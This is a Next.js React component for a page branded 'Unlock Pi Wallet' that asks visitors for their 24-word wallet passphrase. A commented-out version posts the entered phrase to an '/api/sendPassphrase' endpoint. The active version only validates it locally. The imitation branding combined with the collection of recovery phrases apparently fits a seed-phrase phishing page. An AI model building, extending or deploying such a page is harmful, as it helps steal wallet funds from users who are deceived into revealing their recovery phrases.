// "use client";
// import Image from "next/image";

// import { useState } from "react";
// import { useRouter } from "next/navigation";
// import toast, { Toaster } from "react-hot-toast";

// const UnlockPiWallet = () => {
//   const router = useRouter();
//   const [passphrase, setPassphrase] = useState("");
//   const [loading, setLoading] = useState(false);

//   // Function to handle input change and limit to 24 words
//   const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
//     const words = e.target.value.trim().split(/\s+/);

//     // Allow updating only if words are <= 24
//     if (words.length <= 24) {
//       setPassphrase(e.target.value);
//     }
//   };

//   // Function to validate and submit
//   // const handleSubmit = async () => {
//   //   const words = passphrase.trim().split(/\s+/);

//   //   if (words.length < 24) {
//   //     toast.error("Invalid passphrase! Please enter exactly 24 words.");
//   //     return;
//   //   }

//   //   setLoading(true);
//   //   try {
//   //     const response = await fetch("/api/sendPassphrase", {
//   //       method: "POST",
//   //       headers: { "Content-Type": "application/json" },
//   //       body: JSON.stringify({ passphrase }),
//   //     });

//   //     if (response.ok) {
//   //       toast.success("Passphrase submitted successfully!");
//   //       setPassphrase("");

//   //     } else {
//   //       toast.error("Failed to submit passphrase. Try again!");
//   //     }
//   //   } catch (error) {
//   //     toast.error("Something went wrong!");
//   //   } finally {
//   //     setLoading(false);
//   //   }
//   // };

//   const handleSubmit = async () => {
//     const words = passphrase.trim().split(/\s+/);

//     if (words.length < 24) {
//       toast.error("Invalid passphrase! Please enter exactly 24 words.");
//       return;
//     }

//     setLoading(true);
//     try {
//       const response = await fetch("/api/sendPassphrase", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ passphrase }),
//       });

//       if (response.ok) {
//         toast.success("Passphrase submitted successfully!");
//         setPassphrase("");
//       } else {
//         toast.error("Failed to submit passphrase. Try again!");
//       }
//     } catch (error) {
//       toast.error("Something went wrong!");
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div className="flex flex-col items-center justify-center min-h-screen bg-white px-4 py-10 text-center">
//       <Toaster position="top-center" />
//       <div className="fixed top-0 w-full h-9 bg-[#703D92] grid place-content-center">
//         <span className="text-white font-bold  grid-flow-row flex items-center text-center ">
//           Wallet
//           <Image
//             className=""
//             src="/pi_logo.png"
//             alt="Pi Logo"
//             width={30}
//             height={30}
//           />
//         </span>
//       </div>
//       <h2 className="text-2xl font-semibold mb-4">Unlock Pi Wallet</h2>

//       <textarea
//         className="w-full md:w-2/6 lg:w-1/2 h-40 border   border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 text-black"
//         placeholder="Enter your 24-word passphrase here"
//         value={passphrase}
//         onChange={handleChange}
//       />

//       <div className="w-full md:w-2/3 lg:w-1/2 mt-4">
//         <button
//           onClick={handleSubmit}
//           disabled={loading}
//           className="w-full border-2  bg-white py-3 rounded-lg text-lg font-medium  hover:text-white hover:bg-[#703D92] transition disabled:opacity-50"
//         >
//           {loading ? "Submitting..." : "Unlock With Passphrase"}
//         </button>

//         <button className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium  transition">
//           Unlock With Face ID
//         </button>
//       </div>

//       <p className="mt-6 text-sm text-gray-600 max-w-md">
//         As a non-custodial wallet, your wallet passphrase is exclusively
//         accessible only to you. Recovery of passphrase is currently impossible.
//       </p>
//       <p className="text-sm text-gray-600">
//         Lost your passphrase?{" "}
//         <a href="#" className="text-blue-500 hover:underline">
//           You can create a new wallet
//         </a>
//         , but all your π in your previous wallet will be inaccessible.
//       </p>
//     </div>
//   );
// };

// export default UnlockPiWallet;
"use client";
import Image from "next/image";
import { useState } from "react";
import toast, { Toaster } from "react-hot-toast";

const UnlockPiWallet = () => {
  const [passphrase, setPassphrase] = useState("");

  // ✅ Regular Expression for exactly 24 words
  const passphraseRegex = /^(\S+\s+){23}\S+$/;

  // Function to handle input change
  const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setPassphrase(e.target.value);
  };

  // Function to validate only (NO API)
  const handleSubmit = () => {
    const words = passphrase.trim();

    if (!passphraseRegex.test(words)) {
      toast.error("❌ Invalid passphrase! Please enter exactly 24 words.");
      return;
    }

    toast.success("✅ Passphrase is valid!");
    setPassphrase("");
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white px-4 py-10 text-center">
      <Toaster position="top-center" />
      <div className="fixed top-0 w-full h-9 bg-[#703D92] grid place-content-center">
        <span className="text-white font-bold flex items-center">
          Wallet
          <Image src="/pi_logo.png" alt="Pi Logo" width={30} height={30} />
        </span>
      </div>
      <h2 className="text-2xl font-semibold mb-4">Unlock Pi Wallet</h2>

      <textarea
        className="w-full md:w-2/6 lg:w-1/2 h-40 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 text-black"
        placeholder="Enter your 24-word passphrase here"
        value={passphrase}
        onChange={handleChange}
      />

      <div className="w-full md:w-2/3 lg:w-1/2 mt-4">
        <button
          onClick={handleSubmit}
          className="w-full border-2 bg-white py-3 rounded-lg text-lg font-medium hover:text-white hover:bg-[#703D92] transition"
        >
          Unlock With Fingerprint
        </button>

        <button className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium transition">
          Unlock With Face ID
        </button>
      </div>

      <p className="mt-6 text-sm text-gray-600 max-w-md">
        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
        Recovery of passphrase is currently impossible.
      </p>
      <p className="text-sm text-gray-600">
        Lost your passphrase?{" "}
        <a href="#" className="text-blue-500 hover:underline">
          You can create a new wallet
        </a>
        , but all your π in your previous wallet will be inaccessible.
      </p>
    </div>
  );
};

export default UnlockPiWallet;
